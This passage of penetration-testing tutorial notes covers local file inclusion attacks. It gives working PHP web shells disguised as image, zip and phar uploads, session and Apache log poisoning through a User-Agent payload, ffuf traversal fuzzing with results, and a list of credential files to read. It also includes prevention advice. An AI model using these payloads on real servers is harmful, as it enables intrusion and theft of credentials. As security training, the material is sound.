| `include()` / `include_once()` | ✓ | ✓ | ✓ |
| `require()` / `require_once()` | ✓ | ✓ | ✗ |
| **NodeJS** | | | |
| `res.render()` | ✓ | ✓ | ✗ |
| **Java** | | | |
| `import` | ✓ | ✓ | ✓ |
| **.NET** | | | |
| `include` | ✓ | ✓ | ✓ |

### Crafting Malicious Image

Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image.

So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well. We can do so as follows:

```bash
Dudji@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.

Now, we need to upload our malicious image file. To do so, we can go to the Profile Settings page and click on the avatar image to select our image, and then click on upload and our image should get successfully uploaded:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FZXf1hE1MKglYD6oGliZ9%252F%257B9ECDE115-0DF1-4363-A5E2-19D203F00114%257D.png%3Falt%3Dmedia%26token%3De81dc0af-8ed2-41ea-a269-0105323edc70&width=400&dpr=1&quality=100&sign=8c2eff90&sv=2" alt="File upload success" />

### Uploaded File Path

Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed, as follows:

```
http://<SERVER_IP>:/index.php?language=./profile_images/shell.gif&cmd=id
```

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FuXg7p4iFpzxAANeLR7OC%252F%257BFDB80C8B-B987-4CFD-A1B6-807B5DD1A99E%257D.png%3Falt%3Dmedia%26token%3Dffb8a940-617e-4776-84b3-9c8bec17c845&width=400&dpr=1&quality=100&sign=d3e0dc33&sv=2" alt="LFI executing uploaded shell" />

### Zip Upload

We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:

```bash
Dudji@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Even though we named our zip archive as `(shell.jpg)`, some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

Once we upload the `shell.jpg` archive, we can include it with the zip wrapper as `(zip://shell.jpg)`, and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:

```
http://<SERVER_IP>:/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FiTIBs9jNX94WZQ6MAFL6%252F%257B68A126E5-AB52-409E-8CA0-DA8F3DBCDD39%257D.png%3Falt%3Dmedia%26token%3D583416cf-7faf-453b-a4bd-23b2676ceb80&width=400&dpr=1&quality=100&sign=5babaec9&sv=2" alt="Zip upload RCE" />

As we can see, this method also works in executing commands through zipped PHP scripts.

### Phar Upload

Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a phar file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a phar file and rename it to `shell.jpg` as follows:

```bash
Dudji@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with `(&cmd=id)`, as follows:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FV1Wr229dsTwHgzVMB8j1%252Fimage.png%3Falt%3Dmedia%26token%3D34cfcfbe-b098-4b3f-81bf-18110d1dff00&width=400&dpr=1&quality=100&sign=b11a9276&sv=2" alt="Phar upload RCE" />

There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()).

## Log Poisoning

Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.

As was the case in the previous section, any of the following functions with Execute privileges should be vulnerable to these attacks:

| Function | Read Content | Execute | Remote URL |
|---|---|---|---|
| **PHP** | | | |
| `include()` / `include_once()` | ✓ | ✓ | ✓ |
| `require()` / `require_once()` | ✓ | ✓ | ✗ |
| **NodeJS** | | | |
| `res.render()` | ✓ | ✓ | ✗ |
| **Java** | | | |
| `import` | ✓ | ✓ | ✓ |
| **.NET** | | | |
| `include` | ✓ | ✓ | ✓ |

### PHP Session Poisoning

Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the `sess_` prefix. For example, if the PHPSESSID cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a PHPSESSID cookie set to our session:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FXMQL9ZEUUWsxmAxV4TVZ%252Fimage.png%3Falt%3Dmedia%26token%3D54c42d9c-0728-4c4f-8032-6a5e4217ff20&width=400&dpr=1&quality=100&sign=3515eaa1&sv=2" alt="PHPSESSID cookie" />

As we can see, our PHPSESSID cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Let's try include this session file through the LFI vulnerability and view its contents:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FcePsZRL5acPNc7lQlzBy%252F%257B8E470595-E908-4F9D-81C0-FAC94C4B1424%257D.png%3Falt%3Dmedia%26token%3D4abe257c-5939-41dd-b4d7-45cd0dd8b811&width=400&dpr=1&quality=100&sign=2b2f3a00&sv=2" alt="Session file contents" />

We can see that the session file contains two values: `page`, which shows the selected language page, and `preference`, which shows the selected language. The `preference` value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the `page` value is under our control, as we can control it through the `?language=` parameter.

Let's try setting the value of `page` a custom value (e.g. language parameter) and see if it changes in the session file. We can do so by simply visiting the page with `?language=session_poisoning` specified, as follows:

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now, let's include the session file once again to look at the contents:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FND90w6GYVF0IT9TPFkqc%252F%257BA3EDD774-DDB6-4A94-9A4F-4FBE4557D616%257D.png%3Falt%3Dmedia%26token%3Dbc5d1599-b658-4eb2-aa81-d49e016e411a&width=400&dpr=1&quality=100&sign=f0945ded&sv=2" alt="Session poisoning confirmed" />

This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file. Our next step is to perform the poisoning step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:

```
http://<SERVER_IP>:/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use the `&cmd=id` to execute a commands:

```
http://<SERVER_IP>:/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252F9BmNqXgjjOFWrwFADqj4%252F%257B04D27D7D-01D9-4C12-BF20-90D84CC61EDA%257D.png%3Falt%3Dmedia%26token%3Dc454dcff-1940-469e-9620-67832bf1d180&width=400&dpr=1&quality=100&sign=b5b9cf97&sv=2" alt="Webshell in session cmd execution" />

<Warning>
  To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.
</Warning>

### Server Log Poisoning

Both Apache and Nginx maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. `www-data`), while the Apache logs are only readable by users with high privileges (e.g. `root/adm` groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.

By default, Apache logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while Nginx logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations, as will be discussed in the next section.

So, let's try including the Apache access log from `/var/log/apache2/access.log`, and see what we get:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FEoeMdhFR0lUkIBzxJ80f%252F%257BF72AC947-6933-4B8B-8A71-45816F689B1A%257D.png%3Falt%3Dmedia%26token%3D79ff83ba-d4c3-41f0-9024-8ed095d5ed55&width=400&dpr=1&quality=100&sign=bd506f64&sv=2" alt="Apache access.log via LFI" />

As we can see, we can read the log. The log contains the remote IP address, request page, response code, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.

To do so, we will use Burp Suite to intercept our earlier LFI request and modify the `User-Agent` header to Apache Log Poisoning:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FjKqcv9ywIqRLQoCJy34n%252F%257B3789EEF6-644C-42C6-9DBB-D03EF9A8B856%257D.png%3Falt%3Dmedia%26token%3Db155394b-c87d-44f6-b62b-aef99e90f08e&width=400&dpr=1&quality=100&sign=104d5b1e&sv=2" alt="Burp modifying User-Agent for log poisoning" />

We may also poison the log by sending a request through cURL, as follows:

```bash
Dudji@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
Dudji@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with `(&cmd=id)`:

<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FDZ9JI2GyDzhARKmfTQcO%252Fimage.png%3Falt%3Dmedia%26token%3D432f6a0f-72af-446f-80db-91618a8e06e0&width=400&dpr=1&quality=100&sign=df600f5f&sv=2" alt="Command execution via poisoned log" />

The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

```
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
```

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the ssh or ftp services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the mail services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

## Automated Scanning

We may not need to manually exploit the LFI vulnerability in many trivial cases. There are many automated methods that can help us quickly identify and exploit trivial LFI vulnerabilities. We can utilize fuzzing tools to test a huge list of common LFI payloads and see if any of them work, or we can utilize specialized LFI tools to test for such vulnerabilities.

### Fuzzing Parameters

In many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.

For example, we can fuzz the page for common GET parameters, as follows:

```bash
Dudji@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the LFI tests discussed in this module. This is not unique to LFI vulnerabilities but also applies to most web vulnerabilities discussed in other modules, as exposed parameters may be vulnerable to any other vulnerability as well.

For a more precise scan, we can limit our scan to the most popular LFI parameters.

### LFI Wordlists

In many cases, we may want to run a quick test on a parameter to see if it is vulnerable to any common LFI payload, which may save us time in web applications where we need to test for various vulnerabilities.

There are a number of LFI Wordlists we can use for this scan. A good wordlist is `LFI-Jhaddix.txt`, as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the `?language=` parameter we have been testing throughout the module, as follows:

```bash
Dudji@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

As we can see, the scan yielded a number of LFI payloads that can be used to exploit the vulnerability. Once we have the identified payloads, we should manually test them to verify that they work as expected and show the included file content.

### Fuzzing Server Files

In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: Server webroot path, server configurations file, and server logs.

**Server Webroot**

We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its `/uploads` directory through relative paths (e.g. `../../uploads`). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.

To do so, we can fuzz for the `index.php` file through common webroot paths, which we can find in wordlists for Linux or Windows. Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwards.

The following is an example of how we can do all of this with ffuf:

```bash
Dudji@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

As we can see, the scan did indeed identify the correct webroot path at `(/var/www/html/)`. We may also use the same `LFI-Jhaddix.txt` wordlist we used earlier, as it also contains various payloads that may reveal the webroot. If this does not help us in identifying the webroot, then our best choice would be to read the server configurations, as they tend to contain the webroot and other important information, as we'll see next.

**Server Logs/Configurations**

As we have seen in the previous section, we need to be able to identify the correct logs directory to be able to perform the log poisoning attacks we discussed. Furthermore, as we just discussed, we may also need to read the server configurations to be able to identify the server webroot path and other important information (like the logs path!).

To do so, we may also use the `LFI-Jhaddix.txt` wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use wordlists for Linux or Windows, though they are not part of seclists, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:

```bash
Dudji@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

As we can see, the scan returned over 60 results, many of which were not identified with the `LFI-Jhaddix.txt` wordlist, which shows us that a precise scan is important in certain cases. Now, we can try reading any of these files to see whether we can get their content. We will read `(/etc/apache2/apache2.conf)`, as it is a known path for the apache server configuration:

```bash
Dudji@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```

As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable `(APACHE_LOG_DIR)`, which are found in another file we saw above, which is `(/etc/apache2/envvars)`, and we can read it to find the variable values:

As we can see, the `(APACHE_LOG_DIR)` variable is set to `(/var/log/apache2)`, and the previous configuration told us that the log files are `/access.log` and `/error.log`, which have accessed in the previous section.

### LFI Tools

Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are LFISuite, LFiFreak, and liffy. We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

Unfortunately, most of these tools are not maintained and rely on the outdated python2, so using them may not be a long term solution. Try downloading any of the above tools and test them on any of the exercises we've used in this module to see their level of accuracy.

## File Inclusion Prevention

We should now learn how to patch these vulnerabilities and harden our systems to reduce the chances of their occurrence and reduce the impact if they do.

### File Inclusion Prevention

The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any user-controlled inputs into any file inclusion functions or APIs. The page should be able to dynamically load assets on the back-end, with no user interaction whatsoever. Furthermore, in the first section of this module, we discussed different functions that may be utilized to include other files within a page and mentioned the privileges each function has. Whenever any of these functions is used, we should ensure that no user input is directly going into them. Of course, this list of functions is not comprehensive, so we should generally consider any function that can read files.

### Preventing Directory Traversal

If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a universal attack chain.

The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has `basename()`, which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final `/` as the filename. The downside to this method is that if the application needs to enter any directories, it will not be able to do it.

If you create your own function to do this method, it is possible you are not accounting for a weird edge case.

For example, in your bash terminal, go into your home directory (`cd ~`) and run the command `cat .?/.*/.?/etc/passwd`. You'll see Bash allows for the `?` and `*` wildcards to be used as a `.`. Now type `php -a` to enter the PHP Command Line interpreter and run `echo file_get_contents('.?/.*/.?/etc/passwd');`. You'll see PHP does not have the same behaviour with the wildcards, if you replace `?` and `*` with `.`, the command will work as expected.

This demonstrates there is an edge cases with our above function, if we have PHP execute bash with the `system()` function, the attacker would be able to bypass our directory traversal prevention. If we use native functions to the framework we are in, there is a chance other users would catch edge cases like this and fix it before it gets exploited in our web application.

Furthermore, we can sanitize the user input to recursively remove any attempts of traversing directories, as follows:

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

As we can see, this code recursively removes `../` sub-strings, so even if the resulting string contains `../` it would still remove it, which would prevent some of the bypasses we attempted in this module.

### Web Server Configuration

Several configurations may also be utilized to reduce the impact of file inclusion vulnerabilities in case they occur. For example, we should globally disable the inclusion of remote files. In PHP this can be done by setting `allow_url_fopen` and `allow_url_include` to `Off`.

It's also often possible to lock web applications to their web root directory, preventing them from accessing non-web related files. The most common way to do this in today's age is by running the application within Docker. However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding `open_basedir = /var/www` in the `php.ini` file. Furthermore, you should ensure that certain potentially dangerous modules are disabled, like PHP Expect and `mod_userdir`.

If these configurations are applied, it should prevent accessing files outside the web application folder, so even if an LFI vulnerability is identified, its impact would be reduced.

### Web Application Firewall (WAF)

The universal way to harden applications is to utilize a Web Application Firewall (WAF), such as ModSecurity. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a permissive mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the WAF to "blocking mode", just having it in permissive mode can be an early warning sign that your application is being attacked.

It is important to understand the goal of hardening is not to make your system un-hackable, meaning you cannot neglect watching logs over a hardened system because it is "secure". Hardened systems should be continually tested, especially after a zero-day is released for a related application to your system (ex: Apache Struts, RAILS, Django, etc.). In most cases, the zero-day would work, but thanks to hardening, it may generate unique logs, which made it possible to confirm whether the exploit was used against the system or not.

## Interesting Files to Read

<Tabs>
  <Tab title="Linux">
    ```
    /etc/passwd
    /etc/shadow
    /etc/hosts
    /etc/crontab
    /home/<user>/.ssh/id_rsa
    /var/log/apache2/access.log
    /var/log/auth.log
    /proc/self/environ
    /proc/self/cmdline
    ```
  </Tab>
  <Tab title="Windows">
    ```
    C:\Windows\System32\drivers\etc\hosts
    C:\Windows\win.ini
    C:\Windows\System32\config\SAM
    C:\inetpub\logs\LogFiles\
    C:\xampp\apache\logs\access.log
    ```
  </Tab>
</Tabs>
